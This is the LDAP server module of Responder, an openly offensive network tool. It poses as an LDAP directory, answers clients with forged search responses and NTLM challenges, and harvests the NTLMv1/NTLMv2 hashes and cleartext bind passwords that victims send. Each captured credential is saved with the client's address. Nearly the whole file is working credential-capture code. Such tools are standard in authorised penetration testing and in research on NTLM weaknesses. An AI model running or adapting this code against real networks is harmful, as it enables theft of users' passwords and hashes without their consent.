#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from SocketServer import BaseRequestHandler
from packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, LDAPSearchSupportedMechanismsPacket, \
    LDAPNTLMChallenge
from utils import *
import struct
import re


def ParseSearch(data):
    if re.search(r'(objectClass)', data):
        return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
    elif re.search(r'(?i)(objectClass0*.*supportedCapabilities)', data):
        return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9], MessageIDASN2Str=data[8:9]))
    elif re.search(r'(?i)(objectClass0*.*supportedSASLMechanisms)', data):
        return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9], MessageIDASN2Str=data[8:9]))


def ParseLDAPHash(packet, client):
    NTLMSSP3 = re.findall('NTLMSSP\x00\x03\x00\x00\x00.*[^EOF]*', packet, re.DOTALL)
    NTLMPacket = ''.join(NTLMSSP3)
    data = NTLMPacket
    PacketLen = len(data)
    if PacketLen > 0:
        SSPIStart = data[:]
        LMhashLen = struct.unpack('<H', data[14:16])[0]
        LMhashOffset = struct.unpack('<H', data[16:18])[0]
        LMHash = SSPIStart[LMhashOffset:LMhashOffset + LMhashLen].encode("hex").upper()
        NthashLen = struct.unpack('<H', data[22:24])[0]
        NthashOffset = struct.unpack('<H', data[24:26])[0]

    if NthashLen == 24:
        NtHash = SSPIStart[NthashOffset:NthashOffset + NthashLen].encode("hex").upper()
        DomainLen = struct.unpack('<H', data[30:32])[0]
        DomainOffset = struct.unpack('<H', data[32:34])[0]
        Domain = SSPIStart[DomainOffset:DomainOffset + DomainLen].replace('\x00', '')
        UserLen = struct.unpack('<H', data[38:40])[0]
        UserOffset = struct.unpack('<H', data[40:42])[0]
        User = SSPIStart[UserOffset:UserOffset + UserLen].replace('\x00', '')
        WriteHash = User + "::" + Domain + ":" + LMHash + ":" + NtHash + ":" + settings.Config.NumChal
        SaveToDb({
            'module': 'LDAP',
            'type': 'NTLMv1',
            'client': client,
            'user': Domain + '\\' + User,
            'hash': NtHash,
            'fullhash': WriteHash,
        })

    if NthashLen > 60:
        NtHash = SSPIStart[NthashOffset:NthashOffset + NthashLen].encode("hex").upper()
        DomainLen = struct.unpack('<H', data[30:32])[0]
        DomainOffset = struct.unpack('<H', data[32:34])[0]
        Domain = SSPIStart[DomainOffset:DomainOffset + DomainLen].replace('\x00', '')
        UserLen = struct.unpack('<H', data[38:40])[0]
        UserOffset = struct.unpack('<H', data[40:42])[0]
        User = SSPIStart[UserOffset:UserOffset + UserLen].replace('\x00', '')
        WriteHash = User + "::" + Domain + ":" + settings.Config.NumChal + ":" + NtHash[:32] + ":" + NtHash[32:]
        SaveToDb({
            'module': 'LDAP',
            'type': 'NTLMv2',
            'client': client,
            'user': Domain + '\\' + User,
            'hash': NtHash,
            'fullhash': WriteHash,
        })

    if LMhashLen < 2 and settings.Config.Verbose:
        settings.Config.ResponderLogger.info("[LDAP] Ignoring anonymous NTLM authentication")


def ParseNTLM(data, client):
    if re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data):
        NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9], NTLMSSPNtServerChallenge=settings.Config.Challenge)
        NTLMChall.calculate()
        return str(NTLMChall)
    elif re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data):
        ParseLDAPHash(data, client)


def ParseLDAPPacket(data, client):
    if data[1:2] == '\x84':
        PacketLen = struct.unpack('>i', data[2:6])[0]
        MessageSequence = struct.unpack('<b', data[8:9])[0]
        Operation = data[9:10]
        sasl = data[20:21]
        OperationHeadLen = struct.unpack('>i', data[11:15])[0]
        LDAPVersion = struct.unpack('<b', data[17:18])[0]

        if Operation == "\x60":
            UserDomainLen = struct.unpack('<b', data[19:20])[0]
            UserDomain = data[20:20 + UserDomainLen]
            AuthHeaderType = data[20 + UserDomainLen:20 + UserDomainLen + 1]

            if AuthHeaderType == "\x80":
                PassLen = struct.unpack('<b', data[20 + UserDomainLen + 1:20 + UserDomainLen + 2])[0]
                Password = data[20 + UserDomainLen + 2:20 + UserDomainLen + 2 + PassLen]
                SaveToDb({
                    'module': 'LDAP',
                    'type': 'Cleartext',
                    'client': client,
                    'user': UserDomain,
                    'cleartext': Password,
                    'fullhash': UserDomain + ':' + Password,
                })

            if sasl == "\xA3":
                Buffer = ParseNTLM(data, client)
                return Buffer

        elif Operation == "\x63":
            Buffer = ParseSearch(data)
            return Buffer
        elif settings.Config.Verbose:
            print text('[LDAP] Operation not supported')


class LDAP(BaseRequestHandler):
    def handle(self):
        try:
            while True:
                self.request.settimeout(0.5)
                data = self.request.recv(8092)
                Buffer = ParseLDAPPacket(data, self.client_address[0])

                if Buffer:
                    self.request.send(Buffer)
        except socket.timeout:
            pass
